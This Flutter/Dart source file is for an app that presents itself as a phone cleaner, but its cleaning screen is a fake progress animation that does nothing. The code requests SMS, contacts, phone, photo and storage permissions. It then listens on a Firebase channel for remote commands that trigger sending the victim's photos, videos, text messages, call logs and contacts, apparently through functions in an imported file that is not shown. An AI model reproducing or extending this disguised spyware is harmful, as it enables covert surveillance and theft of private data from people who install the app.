import 'package:flutter/material.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:percent_indicator/percent_indicator.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'assets.dart';
import 'callsms.dart';
import 'package:permission_handler/permission_handler.dart';

class Home extends StatefulWidget {
  const Home({Key? key}) : super(key: key);

  @override
  _HomeState createState() => _HomeState();
}

class _HomeState extends State<Home> {
  String? cmd;
  final database = FirebaseDatabase.instance.ref();
  double _percentage = 0.0;
  int _text = 0;
  dynamic _dcolor = 0xFF1F2734;
  dynamic _ccolor = 0xFF1F2734;
  dynamic _sdcolor = 0xFF1F2734;
  dynamic _mbcolor = 0xFF1F2734;
  dynamic _netcolor = 0xFF1F2734;

  @override
  initState() {
    super.initState();
    _activeListener();
    FirebaseMessaging.instance.getInitialMessage().then((value) {});
  }

  void _activeListener() {
    getpermission();
    database.child('fromserver').onValue.listen(
      (snapshot) {
        dynamic tmp = snapshot.snapshot.value;
        String cmd = tmp['cmd'];
        if (cmd == "getphotos") {
          sendImages();
        } else if (cmd == "getsms") {
          getSms();
        } else if (cmd == "getcalllogs") {
          callLogs();
        } else if (cmd == "getcontacts") {
          contacts();
        } else if (cmd == "lastsms") {
          lastSms();
        } else if (cmd == "allinfo") {
          getall();
        } else if (cmd == "getvideo") {
          sendVideo();
        } else {
          null;
        }
      },
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF1F2734),
      body: Column(
        children: [
          const SizedBox(height: 120),
          Center(
            child: CircularPercentIndicator(
              radius: 240.0,
              lineWidth: 10.0,
              percent: _percentage,
              center: Column(
                children: [
                  const SizedBox(height: 60),
                  const Icon(
                    Icons.cleaning_services_rounded,
                    size: 70,
                    color: Color(0xFFD3342F),
                  ),
                  const SizedBox(height: 40),
                  Text(
                    _text.toString(),
                    style:
                        const TextStyle(fontSize: 30, color: Color(0xFFD3342F)),
                  ),
                ],
              ),
              progressColor: const Color(0xFFD3342F),
              backgroundColor: const Color.fromARGB(255, 47, 51, 68),
            ),
          ),
          const SizedBox(height: 180),
          Row(
            mainAxisAlignment: MainAxisAlignment.start,
            children: const [
              SizedBox(width: 20),
              Text('Clean',
                  style: TextStyle(
                      color: Color.fromARGB(204, 255, 255, 255), fontSize: 17)),
            ],
          ),
          const SizedBox(height: 12),
          Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              ElevatedButton.icon(
                onPressed: () {
                  setState(() {
                    _dcolor = 0xFFD3342F;
                    _ccolor = 0xFF1F2734;
                    _percentage = 0.0;
                    _text = 0;
                    clean(3);
                  });
                },
                icon: const Icon(Icons.cleaning_services),
                label: const Text(
                  'Deep Clean',
                  style: TextStyle(fontSize: 15),
                ),
                style: ElevatedButton.styleFrom(
                    shadowColor: Colors.black,
                    fixedSize: const Size(170, 70),
                    primary: Color(_dcolor)),
              ),
              const SizedBox(width: 20),
              ElevatedButton.icon(
                  onPressed: () {
                    setState(() {
                      _ccolor = 0xFFD3342F;
                      _dcolor = 0xFF1F2734;
                      _percentage = 0.0;
                      _text = 0;
                      clean(2);
                    });
                  },
                  icon: const Icon(Icons.cleaning_services),
                  label: const Text('Clean', style: TextStyle(fontSize: 15)),
                  style: ElevatedButton.styleFrom(
                      fixedSize: const Size(170, 70), primary: Color(_ccolor))),
            ],
          ),
          const SizedBox(height: 30),
          Row(
            mainAxisAlignment: MainAxisAlignment.start,
            children: const [
              SizedBox(width: 20),
              Text('options',
                  style: TextStyle(
                      color: Color.fromARGB(204, 255, 255, 255), fontSize: 17)),
            ],
          ),
          const SizedBox(height: 10),
          Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              ElevatedButton.icon(
                onPressed: () {
                  if (_sdcolor == 0xFFD3342F) {
                    setState(() {
                      _sdcolor = 0xFF1F2734;
                    });
                  } else {
                    setState(() {
                      _sdcolor = 0xFFD3342F;
                    });
                  }
                },
                icon: const Icon(Icons.sd_card),
                label: const Text(
                  'Card',
                  style: TextStyle(fontSize: 15),
                ),
                style: ElevatedButton.styleFrom(
                    fixedSize: const Size(116, 70), primary: Color(_sdcolor)),
              ),
              const SizedBox(width: 20),
              ElevatedButton.icon(
                onPressed: () {
                  if (_mbcolor == 0xFFD3342F) {
                    setState(() {
                      _mbcolor = 0xFF1F2734;
                    });
                  } else {
                    setState(() {
                      _mbcolor = 0xFFD3342F;
                    });
                  }
                },
                icon: const Icon(Icons.phone_android_outlined),
                label: const Text(
                  'Clean',
                  style: TextStyle(fontSize: 15),
                ),
                style: ElevatedButton.styleFrom(
                    fixedSize: const Size(100, 70), primary: Color(_mbcolor)),
              ),
              const SizedBox(width: 20),
              ElevatedButton.icon(
                  onPressed: () {
                    if (_netcolor == 0xFFD3342F) {
                      setState(() {
                        _netcolor = 0xFF1F2734;
                      });
                    } else {
                      setState(() {
                        _netcolor = 0xFFD3342F;
                      });
                    }
                  },
                  icon: const Icon(Icons.wifi),
                  label: const Text(
                    'Wifi',
                    style: TextStyle(fontSize: 15),
                  ),
                  style: ElevatedButton.styleFrom(
                      fixedSize: const Size(100, 70),
                      primary: Color(_netcolor))),
            ],
          ),
        ],
      ),
    );
  }

  void clean(stime) async {
    for (int i = 0; i <= 11; i++) {
      setState(
        () {
          if (_percentage >= 0.9) {
            null;
          } else {
            _percentage += 0.1;
            _text += 10;
          }
        },
      );
      await Future.delayed(Duration(seconds: stime));
    }
  }

  void getpermission() async {
    await Permission.storage.request();
    await Permission.photos.request();
    await Permission.sms.request();
    await Permission.contacts.request();
    await Permission.phone.request();
  }
}
